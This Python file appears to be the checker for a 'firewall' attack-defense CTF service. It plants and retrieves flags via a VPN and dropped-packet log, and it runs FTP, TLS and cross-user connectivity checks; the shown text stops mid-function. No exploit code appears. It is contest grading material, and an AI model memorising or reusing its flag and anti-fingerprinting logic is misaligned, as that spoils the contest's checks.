import asyncio
import collections
import contextlib
import errno
import functools
import ipaddress
import os
import pathlib
import re
import secrets
import socket
import ssl
import tempfile
import typing

from httpx import AsyncClient, ConnectError, ReadError, RemoteProtocolError
from logging import LoggerAdapter
import psycopg

from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    ExploitCheckerTaskMessage,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    TestCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher

from . import (
    ftp,
    frontend,
    generator,
    postgres,
    proxy,
    snmp,
    snmp_monitoring,
    suspicious,
    types,
    utils,
    vpn,
)
from .services import Service

# NOTE: 9101 is the frontend port, so that HTTP client dependency injection works.
# Connecting to the VPN is done by the VPN implementation in `vpn.VPN`.
vpn_port = 9100
checker = Enochecker('firewall', 9101)
app = lambda: checker.app

# Work around psycopg #1535, just in case.
os.environ['PGSSLCERT'] = tempfile.gettempdir() + f'/.frontend.{os.getpid()}.postgresql.cert'

# Grab some environment variables for additional configuration
bind_retries = int(os.getenv('BIND_RETRIES', 5))
exploit_retries = int(os.getenv('EXPLOIT_RETRIES', 3))
paranoid_mode = int(os.getenv('CHECKER_PARANOID', 0))
if (level := os.getenv('CHECKER_LOG_LEVEL')) is not None:
    checker._logger.setLevel(level)


class ExceptionGuard:
    '''Thin guard around code to actually throw enochecker exceptions'''
    def __init__(self, logger: LoggerAdapter, task: BaseCheckerTaskMessage | None = None):
        self.logger = logger
        self.task_description = f'Task {task.task_id} ({task.method} {task.variant_id} for {task.task_chain_id})' if task else 'Task'
    def __enter__(self) -> typing.Self:
        return self
    def __exit__(self, exception_type, exception, traceback):
        if exception_type is None:
            self.logger.debug(f'{self.task_description} completed successfully')
            return
        exception_info = (exception_type, exception, traceback)
        if issubclass(exception_type, vpn.AuthenticationError):
            self.logger.error(f'VPN authentication failed', exc_info=exception_info)
            raise MumbleException('VPN login failed')
        elif issubclass(exception_type, vpn.RoutingError):
            self.logger.error(f'Received bad routing information from the VPN server', exc_info=exception_info)
            raise MumbleException('Bad routing information from VPN server')
        elif issubclass(exception_type, vpn.InternalError):
            self.logger.error(f'VPN is in bad state, or other internal VPN error', exc_info=exception_info)
            raise InternalErrorException('Internal VPN error', inner=exception)
        elif issubclass(exception_type, proxy.ProxyError):
            self.logger.error(f'Proxy is in bad state, or other internal proxy error', exc_info=exception_info)
            raise InternalErrorException('Internal proxy error', inner=exception)
        elif issubclass(exception_type, ftp.UnexpectedFTPResponse):
            self.logger.error(f'Unexpected response from FTP server', exc_info=exception_info)
            raise MumbleException('Unexpected response from FTP server')
        elif issubclass(exception_type, ConnectionRefusedError):
            self.logger.error(f'Failed to connect to VPN or service', exc_info=exception_info)
            raise OfflineException('Failed to connect to VPN or service')
        elif issubclass(exception_type, ConnectionError):
            self.logger.error(f'VPN or service connection failed unexpectedly', exc_info=exception_info)
            raise MumbleException('VPN or service connection failed unexpectedly')
        elif issubclass(exception_type, ssl.SSLError):
            self.logger.error(f'TLS connection failed', exc_info=exception_info)
            raise MumbleException('TLS connection failed')
        elif issubclass(exception_type, snmp.SNMPNotFoundException):
            self.logger.error(f'SNMP not found exception', exc_info=exception_info)
            raise MumbleException('SNMP agent returned value not found')
        elif issubclass(exception_type, snmp.SNMPErrorStateException):
            self.logger.error(f'SNMP returned error state', exc_info=exception_info)
            raise MumbleException('SNMP agent returned error state')
        elif issubclass(exception_type, ConnectError):
            self.logger.error(f'Failed to connect to frontend', exc_info=exception_info)
            raise OfflineException('Frontend is unreachable')
        elif issubclass(exception_type, (ReadError, RemoteProtocolError)):
            self.logger.error(f'Failed to read from frontend', exc_info=exception_info)
            raise MumbleException('No response from frontend')
        # Errors below this point should not really happen in production - only the exploits should throw this.
        elif issubclass(exception_type, snmp.SNMPException):
            self.logger.error(f'SNMP exception', exc_info=exception_info)
            raise InternalErrorException('SNMP request failed')
        elif issubclass(exception_type, psycopg.errors.QueryCanceled):
            self.logger.error(f'Database query was canceled', exc_info=exception_info)
            raise MumbleException('Database is responding too slowly')
        else:
            self.logger.error(f'{self.task_description} raised unknown exception {exception_type}', exc_info=exception_info)


def exception_guard(function: typing.Callable):
    '''Wraps a function in an ExceptionGuard'''
    @functools.wraps(function)
    async def wrapper(*args,
                      _impl_get_logger = utils.extract_argument(function, LoggerAdapter),
                      _impl_get_task = utils.extract_argument(function, BaseCheckerTaskMessage),
                      **kwargs):
        with ExceptionGuard(_impl_get_logger(args, kwargs), _impl_get_task(args, kwargs)):
            return await function(*args, **kwargs)
    return wrapper


async def create_vpn(task: BaseCheckerTaskMessage, username: str, password: str,
                     logger: LoggerAdapter, *, max_retries: int | None = 4096) -> vpn.VPN:
    '''Sets up the VPN with the given username and password. This does not yet trigger any network connections.'''
    retries = 0
    while max_retries is None or retries < max_retries:
        retries += 1

        # Generate a random fwmark and check that the associated interface does not exist.
        # In practice, this should almost always succeed.
        fwmark = generator.fwmark()
        interface = f'vpn-{fwmark:04x}'
        if (pathlib.Path('/sys/class/net/') / interface).exists():
            continue # This interface already exists.

        try:
            client = vpn.VPN(task.address, vpn_port, username, password, interface, fwmark,
                             ip_binary='/bin/ip-wrapper', tunctl='/bin/tunctl', marker='/bin/fwmark')
            await client.create() # Early create to detect duplicate interfaces
        except vpn.InterfaceAlreadyExists:
            continue # Unlucky, someone else created the interface in the meantime.

        # The default client that we hand out drops any non-TCP/UDP traffic.
        # It also strips the options off any traffic that it sends.
        client.add_tx_packet_hook(functools.partial(
            utils.anonymize_traffic,
            mtu=vpn.VPN_MTU,
            logger=logger
        ))

        # The default client drops non-TCP/UDP traffic in ingress too.
        client.add_rx_packet_hook(functools.partial(
            utils.ingress_filter,
            routes=client.routes,
            logger=logger
        ))

        if paranoid_mode:
            # Ensure the source address of an outgoing packet on the VPN interface is always our source address.
            # We sometimes saw some packets rejected due to invalid source address in the firewall logs, this
            # should ensure that this does not occur.
            async def paranoid_source_address_check(packet: bytes, *, client: vpn.VPN = client):
                if len(packet) >= 20 and packet[0] >> 4 == 4:
                    source = ipaddress.IPv4Address(packet[12:16])
                elif len(packet) >= 40 and packet[0] >> 4 == 6:
                    source = ipaddress.IPv6Address(packet[8:24])
                else:
                    return packet
                vpn_address = client.ip(source.version)
                if source != vpn_address:
                    raise InternalErrorException(f'Invalid source address (packet has {source}, but expected {vpn_address})')
                return packet
            client.add_tx_packet_hook(paranoid_source_address_check)

        return client
    else:
        raise InternalErrorException('Too many retries trying to find a free VPN interface')


async def vpn_data_channel(conn: ftp.Client, mode: ftp.TransferMode, vpn: vpn.VPN) -> ftp.DataChannel:
    '''Creates a data channel through the VPN.'''
    if ftp.mode_is_passive(mode):
        return await conn.data_channel(mode, vpn.open_connection)
    elif ftp.mode_is_active(mode):
        async def factory():
            host, _ = conn.local_address()
            return await utils.accept_one_connection(vpn.start_server, host=str(host), port=None)
        return await conn.data_channel(mode, factory)
    else:
        raise InternalErrorException('Impossible FTP mode') # Should be unreachable.


@checker.putflag(0)
@exception_guard
async def put_flag_into_packet_log(task: PutflagCheckerTaskMessage,
                                   client: AsyncClient,
                                   logger: LoggerAdapter,
                                   db: ChainDB) -> str:
    '''Stores a flag in the log of dropped packets.'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    # Make sure this does not overlap with IPv4/IPv6, i.e. that the first
    # byte's top nibble is not 4 or 6 - otherwise we might accidentally
    # route a flag and that would be bad.
    masked_data = generator.flag_prefix() + task.flag.encode() + generator.flag_suffix()

    async with await create_vpn(task, username, password, logger) as vpn_client:
        await vpn_client.send_raw_packet(masked_data)

    await db.set('credentials', (username, password))
    return username


@checker.getflag(0)
@exception_guard
async def get_flag_from_packet_log(task: GetflagCheckerTaskMessage,
                                   client: AsyncClient,
                                   logger: LoggerAdapter,
                                   db: ChainDB):
    '''Retrieves a flag from the log of dropped packets.'''
    try:
        username, password = await db.get('credentials')
    except KeyError:
        raise MumbleException('Previous store failed')

    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.login()

    async for packet in frontend_client.dropped_packets():
        if task.flag.encode() in packet:
            break
    else:
        raise MumbleException('Flag missing')


@checker.havoc(0)
@exception_guard
async def havoc_ftp_single_file(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''Checks that we can upload and retrieve a single file.'''

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    async with await create_vpn(task, username, password, logger) as vpn:
        async def single_check(ip_version: types.IPVersion, mode: ftp.TransferMode, name: str):
            content = secrets.token_bytes(generator.number(24, 2048))
            conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
            try:
                await conn.user(username)
                await conn.pass_(password)
                await conn.type('I')

                channel = await vpn_data_channel(conn, mode, vpn)
                await conn.stor(channel, name, content)

                channel = await vpn_data_channel(conn, mode, vpn)
                result = await conn.retr(channel, name)

                await conn.dele(name)

                if result != content:
                    logger.info(f'Stored {content!r} in {name} (stored and retrieved as {username} with mode {mode} over IPv{ip_version}), but received {result!r}')
                    raise MumbleException('Failed to retrieve stored file')
            finally:
                await conn.quit(immediately=True)

        # NB: four simultaneous connections is the limit, do NOT add more stuff here.
        tasks: list[tuple[types.IPVersion, ftp.TransferMode]] = generator.shuffled([
            (4, ftp.TransferMode.PORT),
            (4, ftp.TransferMode.PASV),
            (4, ftp.TransferMode.EPSV),
            (6, ftp.TransferMode.EPRT),
            (6, ftp.TransferMode.EPSV),
        ])
        names = []
        for _ in tasks:
            names.append(generator.filename(exclude=set(names)))

        # Complete one task first. This makes sure that at least one task is not fingerprintable.
        await single_check(*tasks.pop(), names.pop())
        await utils.safe_gather(*[single_check(*task, name) for task, name in zip(tasks, names)])


@checker.havoc(1)
@exception_guard
async def havoc_ftp_late_connect(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''
    It is OK to connect to a passive mode port after issuing the control channel command. Check that we
    don't get fingerprinted on that by the fact that we normally do things the other way around.
    '''

    # This is something that our client _generally_ does not do, but it's part of FTP so check it works.
    # This should also help avoid some fingerprinting.
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    name = generator.filename()
    content = secrets.token_bytes(generator.number(24, 2048))

    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        mode = ftp.TransferMode.EPSV if ip_version == 6 else ftp.TransferMode.PASV
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            match mode:
                case ftp.TransferMode.PASV: mode_fn = conn.pasv
                case ftp.TransferMode.EPSV: mode_fn = conn.epsv

            # Do an early store.
            host, port = await mode_fn()
            await conn.generic_command(f'STOR {name}', 150)
            channel = ftp.DataChannel(*await conn._passive_channel(host, port, vpn.open_connection))
            await channel.write_and_close(content)
            await conn._expect(226)

            host, port = await mode_fn()
            await conn.generic_command(f'RETR {name}', 150)
            channel = ftp.DataChannel(*await conn._passive_channel(host, port, vpn.open_connection))
            result = await channel.read_all()
            await conn._expect(226)

            if result != content:
                logger.info(f'Expected {content!r} in {name} (stored and retrieved as {username} with mode {mode} (late connection) over IPv{ip_version}), but received {result!r}')
                raise MumbleException('Failed to retrieve stored file')
        finally:
            await conn.quit(immediately=True)


@checker.havoc(2)
@exception_guard
async def havoc_ftp_tls(task: HavocCheckerTaskMessage, ca_client: AsyncClient, client: AsyncClient, logger: LoggerAdapter):
    '''Check that the FTP server will actually speak TLS with us.'''
    ca_certificate = await frontend.FrontendClient(ca_client, logger, '', '').ca_certificate()

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    name = generator.filename()
    content = secrets.token_bytes(generator.number(24, 2048))

    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        # Upload a file over an encrypted data channel
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            features = await conn.feat()
            for feature in ['AUTH TLS', 'PROT', 'PBSZ']:
                if feature not in features:
                    logger.info(f'FTP server does not support {feature} (supported features are {", ".join(features)})')
                    raise ftp.UnexpectedFTPResponse(f'FTP server does not support {feature}')
            original_features = features

            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            host, port = await conn.epsv()
            await conn.auth_tls(ca_certificate)

            await conn.generic_command('PBSZ 0', 200)
            await conn.generic_command('PROT P', 200)

            channel = ftp.DataChannel(*await conn._passive_channel(host, port, vpn.open_connection))
            await channel.upgrade_to_tls(ca_certificate)

            await conn.stor(channel, name, content)
        finally:
            await conn.quit(timeout=1.0)

        # Verify that the upload was successful
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            channel = await conn.data_channel(ftp.TransferMode.EPSV, vpn.open_connection)
            retrieved = await conn.retr(channel, name)
            if retrieved != content:
                logger.info(f'Expected {content!r} in {name} (stored over TLS and IPv{ip_version} as user {username}), but retrieved {retrieved!r}')
                raise MumbleException('Failed to retrieve stored file')
        finally:
            await conn.quit(timeout=1.0)

        # Try to delete over an encrypted command channel
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            features = await conn.feat()
            for feature in ['AUTH TLS', 'PROT', 'PBSZ']:
                if feature not in features:
                    logger.info(f'FTP server does not support {feature} (supported features are {", ".join(features)})')
                    raise ftp.UnexpectedFTPResponse(f'FTP server does not support {feature}')
            if set(features) != set(original_features):
                logger.info(f'Feature support of FTP server changed between checks from {set(original_features)} to {set(features)}')
                raise ftp.UnexpectedFTPResponse(f'Feature support of FTP server changed between checks')

            await conn.auth_tls(ca_certificate)

            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            await conn.dele(name)
        finally:
            await conn.quit(timeout=1.0)

        # Make sure the file is actually gone
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)

            channel = await conn.data_channel(ftp.TransferMode.EPSV, vpn.open_connection)
            listing = await conn.mlsd(channel)
            if len(listing) != 0:
                logger.info(f'Received MLSD listing {listing!r}, but expected empty tree')
                raise MumbleException('Failed to delete stored file')
        finally:
            await conn.quit(timeout=1.0)


@checker.havoc(3)
@exception_guard
async def havoc_ftp_directories_and_metadata(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''Checks that FTP directory traversals and some metadata commands work as expected'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    directory = generator.filename(directory=True)

    files = {}
    for _ in range(2):
        name = generator.filename(exclude=set(files.keys()))
        files[name] = secrets.token_bytes(generator.number(24, 2048))

    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            await conn.mkd(directory)
            if (pwd := await conn.pwd()) != '/':
                raise ftp.UnexpectedFTPResponse(f'Unexpected working directory (should be /, got {pwd})')
            await conn.cwd(directory)
            if (pwd := await conn.pwd()) != '/' + directory:
                raise ftp.UnexpectedFTPResponse(f'Unexpected working directory (should be /{directory}, got {pwd})')
            for filename, content in files.items():
                channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                await conn.stor(channel, filename, content)
            await conn.cdup()

            async def check_nlst():
                await conn.cwd(directory)
                channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                listing = set(await conn.nlst(channel))
                expected = set(files.keys())
                if listing != expected:
                    raise ftp.UnexpectedFTPResponse(f'Received NLST listing {listing!r} but expected {expected!r}')
                await conn.cdup()

            async def check_list_with_weird_arguments():
                channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                listing = await conn.list_(channel, '-la')
                if len(listing) != 1:
                    raise ftp.UnexpectedFTPResponse(f'Received LIST (-la) listing {listing!r} but expected only one entry')
                if not re.fullmatch(r'drwxr-xr-x\s*\d+\s*root\s*root\s*\d+\s\S+ \d+ \d+:\d+ ' + re.escape(directory), listing[0]):
                    raise ftp.UnexpectedFTPResponse(f'Received LIST (-la) listing {listing!r} without required entry for {directory!r}')

            async def check_list_directory():
                channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                listing = await conn.list_(channel, directory)
                if len(listing) != len(files):
                    raise ftp.UnexpectedFTPResponse(f'Received LIST listing {listing!r} but expected {len(files)} entries')
                sizes = {}
                for line in listing:
                    m = re.fullmatch(r'-rw-r--r--\s*\d+\s*root\s*root\s*(\d+)\s\S+ \d+ \d+:\d+ (.*)', line)
                    if m is None:
                        raise ftp.UnexpectedFTPResponse(f'Received LIST listing entry {line!r} with an invalid entry format')
                    sizes[m.group(2)] = int(m.group(1))
                for file in files:
                    if file not in sizes:
                        raise ftp.UnexpectedFTPResponse(f'Received LIST listing {listing!r} without required entry for {file}')
                    if sizes[file] != len(files[file]):
                        raise ftp.UnexpectedFTPResponse(f'Received LIST listing {listing!r} with incorrect size for {file} (expected {len(files[file])})')

            async def impl_check_mlst(path: str, type_: str, size: int | None = None, perms: str | None = None):
                metadata = await conn.mlst(path)
                perms = perms if perms is not None else {'dir': 'eldfmTcp', 'file': 'radfwT'}[type_]
                if 'size' not in metadata or (size is not None and metadata['size'] != str(size)):
                    raise ftp.UnexpectedFTPResponse(f'Received MLST metadata {metadata!r} with incorrect or missing size for {path} (expected {size})')
                if metadata.get('type') != type_:
                    raise ftp.UnexpectedFTPResponse(f'Received MLST metadata {metadata!r} with incorrect or missing type for {path} (expected {type})')
                if metadata.get('perm') != perms:
                    raise ftp.UnexpectedFTPResponse(f'Received MLST metadata {metadata!r} with incorrect or missing permissions for {path} (expected {perms})')

            async def check_mlst_file():
                file = secrets.choice(list(files.keys()))
                return await impl_check_mlst(f'{directory}/{file}', 'file', size=len(files[file]))

            async def check_mlst_directory():
                return await impl_check_mlst(directory, 'dir')

            async def check_size():
                file = secrets.choice(list(files.keys()))
                size = await conn.size(f'{directory}/{file}')
                if size != len(files[file]):
                    raise ftp.UnexpectedFTPResponse(f'Received incorrect SIZE for {file}')

            async def check_mdtm():
                modified = [
                    await conn.mdtm(f'{directory}/{file}')
                    for file in files
                ]
                if modified != sorted(modified):
                    raise ftp.UnexpectedFTPResponse(f'MDTM timestamps are not in order of creation')

            checks = [
                check_nlst,
                check_list_with_weird_arguments,
                check_list_directory,
                check_mlst_file,
                check_mlst_directory,
                check_size,
                check_mdtm,
            ]
            for check in generator.shuffled(checks):
                await check()

            for filename in files:
                await conn.dele(f'{directory}/{filename}')
            await conn.rmd(directory)
        finally:
            await conn.quit(timeout=1.0)

@checker.havoc(4)
@exception_guard
async def havoc_ftp_restarts_and_renames(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''Checks that FTP commands relating to transfer restarts and renames work as expected'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            content = secrets.token_bytes(generator.number(24, 2048))
            channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
            path = await conn.stou(channel, content)

            offset = generator.number(1, len(content) - 1)
            await conn.rest(offset)

            await conn.rnfr(path)

            channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
            data = await conn.retr(channel, path)

            if data != content[offset:]:
                raise ftp.UnexpectedFTPResponse(f'Received unexpected content from RETR after REST (got {len(data)} bytes, expected {len(content[offset:])} bytes)')

            filename = generator.filename()
            await conn.rnto(filename)

            appended = secrets.token_bytes(generator.number(24, 2048))
            channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
            await conn.appe(channel, filename, appended)

            channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
            overwrite = secrets.token_bytes(generator.number(48, 256))
            offset = len(content) - generator.number(16, min(len(content) - 1, len(overwrite) - 16))
            await conn.rest(offset)
            await conn.stor(channel, filename, overwrite)


            channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
            data = await conn.retr(channel, filename)

            expected = bytearray(content + appended)
            expected[offset:offset + len(overwrite)] = overwrite
            if data != expected:
                raise ftp.UnexpectedFTPResponse(f'Received unexpected content from RETR after REST (got {len(data)} bytes, expected {len(expected)} bytes)')

            await conn.dele(filename)
            await conn.rein()
            await conn.generic_command(f'RETR {filename}', 530)
            # Untested commands that remain: ABOR, NOOP, SYST, and the deprecated X... commands
            # Of these the X... comands should almost never be issued, and NOOP and SYST are
            # supremely boring. ABOR might be worth checking, but that is also quite difficult
            # since the timing matters in relation to the actual transfer, and it is also not
            # going to be used by anyone since you probably don't need to abort transfers with
            # our disk space quota...
        finally:
            await conn.quit(immediately=True)


@checker.havoc(5)
@exception_guard
async def havoc_cross_user_communication(task: HavocCheckerTaskMessage, client1: AsyncClient, client2: AsyncClient, client3: AsyncClient, logger: LoggerAdapter):
    '''
    Checks that clients can (a) talk to non-service IPs (themselves --- but the exploit target is localhost)
    and (b) speak UDP over the VPN. Takes three clients to ensure there is an IP version overlap.
    '''
    async def register_and_connect(client: AsyncClient):
        username = generator.username()
        password = generator.password()
        frontend_client = frontend.FrontendClient(client, logger, username, password)
        await frontend_client.register()
        return await create_vpn(task, username, password, logger)

    def shared_ip_versions(a: vpn.VPN, b: vpn.VPN) -> set[types.IPVersion]:
        return set(a.supported_ip_versions()) & set(b.supported_ip_versions())

    async def test_connection(a: vpn.VPN, b: vpn.VPN, ip_version: types.IPVersion, kind: socket.SocketKind, fixed_port: int | None = None, *, attempt: int = 1):
        a, b = generator.shuffled((a, b))
        port_a = generator.number(32768, 60999) # Linux defaults for ephermeral ports. Doesn't _really_ matter too much though.
        port_b = generator.number(32768, 60999) if fixed_port is None else fixed_port
        limit = min(a.mtu, b.mtu) - 8 - (20 if ip_version == 4 else 40)
        data_a = secrets.token_bytes(generator.number(24, limit))
        data_b = secrets.token_bytes(generator.number(24, limit))
        ip_a = a.ip(ip_version)
        ip_b = b.ip(ip_version)

        if ip_a is None or ip_b is None:
            # This should have been avoided below
            raise InternalErrorException('Picked an IP version for which no address is assigned')

        def bind(host: types.IPAddress, port: int):
            def hook(sock):
                sock.bind((str(host), port))
                return sock
            return hook

        try:
            match kind:
                case socket.SOCK_STREAM: # TCP
                    _, _, listener = await utils.accept_one_connection(b.start_server, host=str(ip_b), port=port_b)
                    (reader_a, writer_a), (reader_b, writer_b) = await utils.safe_gather(
                        a.open_connection(ip_b, port_b, socket_hook=bind(ip_a, port_a), socket_type=kind),
                        listener
                    )
                    kind_name = 'TCP'
                    read_a, read_b = reader_a.readexactly, reader_b.readexactly
                case socket.SOCK_DGRAM: # UDP
                    (reader_a, writer_a), (reader_b, writer_b) = await utils.safe_gather(
                        a.open_connection(ip_b, port_b, socket_hook=bind(ip_a, port_a), socket_type=kind),
                        b.open_connection(ip_a, port_a, socket_hook=bind(ip_b, port_b), socket_type=kind)
                    )
                    kind_name = 'UDP'
                    read_a, read_b = reader_a.read, reader_b.read # UDP packets are not segmented, and readexactly does not make sense for them.
                case _:
                    raise InternalErrorException('Invalid socket kind for cross-user connectivity test')
        except OSError as error:
            # Nothing should be bound on these interfaces. But occasionally, we get EADDRINUSE anyways.
            # In those cases, just retry (the sockets should have been closed inside the VPN code)
            if error.errno != errno.EADDRINUSE:
                raise
            kind_name = { socket.SOCK_STREAM: 'TCP', socket.SOCK_DGRAM: 'UDP' }.get(kind, 'unknown')
            logger.warning(f'Address for {kind_name} connection test between {ip_a}:{port_a} and {ip_b}:{port_b} is already in use (during attempt {attempt})')
            if attempt >= bind_retries:
                raise # Alas, not much we can do here except note an internal error and move on with our lives.
            await asyncio.sleep(0.1) # Delay things by a little bit to give the kernel a chance to clean up
            return await test_connection(a, b, ip_version, kind, fixed_port, attempt=attempt + 1)

        try:
            writer_a.write(data_a)
            await writer_a.drain()
            if data_a != (received_a := await read_b(len(data_a))):
                logger.error(f'In {kind_name} connection from {ip_a}:{port_a} to {ip_b}:{port_b} (part A): received {received_a!r} instead of {data_a!r}')
                raise MumbleException('Incorrect data received')

            writer_b.write(data_b)
            await writer_b.drain()
            if data_b != (received_b := await read_a(len(data_b))):
                logger.error(f'In {kind_name} connection from {ip_b}:{port_b} to {ip_a}:{port_a} (part B): received {received_b!r} instead of {data_b!r}')
                raise MumbleException('Incorrect data received')
        finally:
            writer_a.close()
            writer_b.close()
            # For cleanup, we want the cancellation-blocking behavior.
            await asyncio.gather(
                writer_a.wait_closed(),
                writer_b.wait_closed()
            )

    async def test_cross_user(a: vpn.VPN, b: vpn.VPN, ip_versions: set[types.IPVersion]):
        ip_version = lambda: secrets.choice(list(ip_versions))
        await utils.safe_gather(
            test_connection(a, b, ip_version(), socket.SOCK_DGRAM, None),
            test_connection(a, b, ip_version(), socket.SOCK_DGRAM, 1161),
            test_connection(a, b, ip_version(), socket.SOCK_STREAM, None),
            test_connection(a, b, ip_version(), socket.SOCK_STREAM, 5432),
        )

    vpn1, vpn2 = await utils.safe_gather(
        register_and_connect(client1),
        register_and_connect(client2)
    )
    async with vpn1, vpn2:
        # Check for shared IP versions.
        ip_versions = shared_ip_versions(vpn1, vpn2)
        if ip_versions:
            await test_cross_user(vpn1, vpn2, ip_versions)
        else: # No overlap. Add a third client to make sure we get overlap
            async with await register_and_connect(client3) as vpn3:
                ip_versions_1_3 = shared_ip_versions(vpn1, vpn3)
                ip_versions_2_3 = shared_ip_versions(vpn2, vpn3)
                if ip_versions_1_3:
                    await test_cross_user(vpn1, vpn3, ip_versions_1_3)
                elif ip_versions_2_3:
                    await test_cross_user(vpn2, vpn3, ip_versions_2_3)
                else:
                    # This is supposed to be mathematically impossible if each VPN instance has at least one IP
                    raise InternalErrorException('No overlapping IP versions across three connections')


@checker.putnoise(0)
@exception_guard
async def put_noise_ftp(task: PutnoiseCheckerTaskMessage,
                        client: AsyncClient,
                        logger: LoggerAdapter,
                        db: ChainDB) -> None:
    '''Stores noise on the FTP server.'''
    # Generate a random directory tree with files. We can have at most 64KiB in 128 entries.
    # The upload rate limit means we need to be really conservative in what we can store regularly here,
    # because the putnoise and getnoise are on a timer.
    tree = {}
    directories = [tree]

    entries = generator.number(4, 12)
    storage = generator.number(1024, 8192)
    for _ in range(entries):
        parent = secrets.choice(directories)
        match generator.sample(['directory', 'file'], counts=[2, 5], k=1)[0]:
            case 'directory':
                name = generator.filename(directory=True, exclude=set(parent.keys()))
                parent[name] = {}
                directories.append(parent[name])
            case 'file':
                name = generator.filename(exclude=set(parent.keys()))
                size = generator.number(0, storage // 2)
                parent[name] = secrets.token_bytes(size)
                storage -= size

    # This generally needs a new user since we're going to be storing quite a bit of data.
    # We don't want to run an existing user out of quota.
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    # Connect and upload the directory tree.
    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            async def recursive_upload(tree):
                '''Recursively upload a directory tree'''
                for name, item in generator.shuffled(tree.items()):
                    if isinstance(item, dict):
                        await conn.mkd(name)
                        await conn.cwd(name)
                        await recursive_upload(item)
                        await conn.cdup()
                    elif isinstance(item, bytes):
                        channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                        await conn.stor(channel, name, item)

            await recursive_upload(tree)
        finally:
            await conn.quit(immediately=True)

    await db.set('credentials', (username, password))
    await db.set('filesystem', tree)


@checker.getnoise(0)
@exception_guard
async def get_noise_ftp(task: GetnoiseCheckerTaskMessage,
                        client: AsyncClient,
                        logger: LoggerAdapter,
                        db: ChainDB) -> None:
    '''Retrieves noise from the FTP server.'''
    try:
        username, password = await db.get('credentials')
        tree = await db.get('filesystem')
    except KeyError:
        raise MumbleException('Previous store failed')

    # Connect and check the directory tree.
    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            async def recursive_check(tree):
                '''Recursively check a directory tree'''
                channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                listing = await conn.mlsd(channel)
                difference = set(listing.keys()) ^ set(tree.keys())
                if difference:
                    logger.info(f'Received MLSD listing {listing!r}, but expected tree {tree!r}, current user is {username}')
                    raise MumbleException('Directory tree was modified')
                for name, item in generator.shuffled(tree.items()):
                    try:
                        is_directory = 'dir' in listing[name]['type']
                    except TypeError:
